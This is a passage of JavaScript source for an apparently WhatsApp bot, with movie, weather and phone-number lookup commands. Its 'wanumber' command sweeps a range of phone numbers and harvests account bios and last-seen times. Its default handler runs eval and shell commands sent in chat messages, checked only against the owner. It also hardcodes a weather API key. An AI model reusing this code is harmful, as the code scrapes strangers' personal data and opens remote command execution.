            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           Tan.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break
            
case 'cuaca':
case 'weather':{
if (!text) return replyTan('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           Tan.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replyTan(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replyTan(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Tan.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await Tan.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replyTan(`${text66}${nobio}${nowhatsapp}`)
        }
break

default:

if (budy.startsWith('<')) {
if (!isTanOwner) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!isTanOwner) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyTan(err)
                        if (stdout) return replyTan(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!isTanOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!isTanOwner) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Tan.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
Tan.sendMessage(`${owner}@s.whatsapp.net`, { text: "Halo pengembang, sepertinya ada kesalahan, mohon diperbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
